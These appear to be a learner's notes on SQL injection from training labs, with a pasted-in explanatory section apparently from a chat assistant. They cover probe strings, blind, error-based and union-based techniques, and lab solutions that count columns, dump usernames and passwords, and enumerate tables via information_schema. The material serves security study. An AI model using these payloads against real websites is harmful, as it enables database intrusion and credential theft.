In short if user input is not sanitized before interacting with a database (postgresql).
User could inject a sql command to interact with said database.

Some basic tests:
	1
	1'
	1"
	[1]
	1`
	1\
	1/*'*/
	1/*!1111'*/
	1'||'asd'||'
	1' or '1'='1
	1 or 1=1
	'or''='


Some types of injections are blind, in a way if the server doesn't directly relays data to you.
You could be interacting with the db blindly hence the name blind sql injections.

For blind sql injections there are couple types of attacks:
	Boolean attacks (true or false)
	Time based attacks (sleep())

To be able to perform blind sql injections you will need very good knowledge of sql.
Lots of time and ability to script and automate will come in very handy.
Example tool sqlmap.

For example, let's say this is how the website retrieves blog posts.
`https://website.thm/blog?id=1`  
  
From the URL above, you can see that the blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

```sql
SELECT * FROM blog WHERE ID=1;-- AND private=0 LIMIT 1;
```

So knowing how the sql statement looks behind the scenes.
We can try modifying the url with a sql injection to try and end the statement earlier.

Thus attempting to retrieve blogs who are private as well, (private=0 is bypassed).
Ending of a sql statement is done via ; semicolon and comments are written with -- double dash.

```sql
SELECT * FROM blog WHERE ID=1;-- AND private=0 LIMIT 1;
```

This will ignore the logic of matching blogs where private is = 0 and fetching those blogs to us regardless.

https://website.thm/blog?id=1;--

## In-Band sql injections

## Error Based sql injections

Is a type that relies on errors being returned so that we can formulate a sql injection that will return the data to the webpage.
For the first attempt it is a good idea to start with a single/double quotation mark to cause an error to show up.
## Union Based sql injections

Is a type that uses UNION alongside SELECT operators to extract large amounts of data.
(union - from multiple databases)

The methodology of these error based sql injections with union and else is:
(scenario login form)

Form an injection that will not cause an error, allowing you to further expand and enumerate.

Next step is to establish the number of cols in the current table in this example it will be users table.
We find out somehow that user admin123 exists and we append union to it.

```sql
admin123' UNION SELECT 1;--
-- or
admin123' ORDER BY 1--
-- or
admin123' UNION SELECT NULL--
```

And we keep adding 1,2,3 to select statement until we get a true (boolean) response confirming the validity of our sql query.

**LAB** - find number of cols in the table.
**Solution** - `/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--` 

*SQL cheatsheet*
https://portswigger.net/web-security/sql-injection/cheat-sheet
Because every database language is slightly different and has it's requirements for syntax here is the cheat-sheet to help.

#### Finding columns with useful data types

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
By this enumeration, pay attention to errors or if data is returned or not to validate if a given column contains data of type string ('a').
This is a scenario where we concluded that the table has 4 columns, and payloads length is adjusted accordingly.

**LAB** - dump login creds, there is a table `users` and it contains cols `username & password`.
**Solution** - `/filter?category=Gifts' UNION SELECT username,password FROM users--`

*Tip:* Concatenate multiple values in a single column.
```sql
' UNION SELECT username || '~' || password FROM users--
```

**LAB** - dump login creds, multiple values in a single column.
**Solution** - `/filter?category=Pets' UNION SELECT NULL,username || '~' || password FROM users--`
We first needed to enumerate the columns data types, we found 2 cols and second one is a string.
And we use that string col to exfiltrate username and password from users table by concatenating the two and exfiltrating it via selected string.


Now we can start enumeration process.
Utilizing database() function, like operator, and '%' which is just a wildcard such as * is in shell.

Knowing that we can discover database name:
```sql
`admin123' UNION SELECT 1,2,3 where database() like 'a%';--`
```

Starting with 'a%' which will match anything for the wildcard but starting with 'a'.
Now you see the idea of the discovery of the db name.

Eventually we discover the db name is sqli_three, now use that information to enumerate table names using a similar method by utilising the information_schema database.

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

So each database contains a table, we know that the db name is sqli_three and we are enumerating for a table_name the same way like we did for db name using '%'.
INFO: information_schema is the database where **the information about all the other databases is kept**

To clear out any confusion, here is an explainer in detail:

### Explainer
You're right about the general idea: SQL injection with `information_schema` allows us to explore the database structure rather than just querying data directly. Let’s break down this specific injection to clarify each part.

### Key Components of the Injection

Here's the injection you're analyzing:

sql

Copy code

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

Each part of this query serves a specific purpose. Let's dissect it:

1. **`admin123'`**:
    
    - This is often used to terminate an existing SQL query that the application sends, closing out a predefined condition.
    - Here, it's likely terminating a condition like `WHERE username = 'admin123'` so that your injected `UNION` statement can follow it.
2. **`UNION SELECT 1,2,3`**:
    
    - The `UNION` statement allows you to add an additional result set to the original query's results.
    - The values `1,2,3` are placeholders that match the number of columns in the original query.
    - This part essentially combines the original query's output with your injected query, allowing the database to display the results from both.
3. **`FROM information_schema.tables`**:
    
    - `information_schema` is a special database in most relational database systems, containing metadata about the database itself.
    - Here, you're querying `tables`, a system table listing all tables within all databases.
    - This lets you explore the structure of the database without needing to know its exact details in advance.
4. **`WHERE table_schema = 'sqli_three'`**:
    
    - `table_schema` is a column in `information_schema.tables` that indicates the database a table belongs to.
    - Here, it filters results to only display tables within the `sqli_three` database. (The database name `sqli_three` could be identified through other injections or prior knowledge.)
5. **`AND table_name LIKE 'a%'`**:
    
    - This clause further filters the tables, selecting only those with names that start with the letter 'a'.
    - `LIKE` is a pattern-matching operator; `'a%'` specifies that the table name should begin with 'a' (the `%` is a wildcard, matching any number of following characters).
    - This is useful for selectively discovering tables when you don’t know all the names but have a guess at a pattern.
6. **`--`**:
    
    - This is a SQL comment symbol, used to ignore the rest of the original query that follows your injection.
    - It ensures that anything the application appends to complete the original SQL statement is treated as a comment and doesn’t interfere with your injected query.

### Purpose of This Injection

In summary, this injection is trying to:

1. Terminate the original query and introduce a `UNION SELECT` statement to append data from a separate query.
2. Use `information_schema.tables` to list tables in the `sqli_three` database that have names starting with 'a'.
3. Mask the remainder of the original query with `--`, so the injection completes successfully without syntax errors.

### Why Use `information_schema`?

The purpose of querying `information_schema` is to gather information on the database structure:

- It lets you enumerate tables and columns without prior knowledge.
- Once you know table names and their columns, you can refine injections to retrieve or manipulate specific data from those tables.

In a typical SQL injection exploit, after discovering table names, you'd then query `information_schema.columns` to list out the columns in each table. This helps you understand what data each table holds and enables more targeted queries in subsequent injections.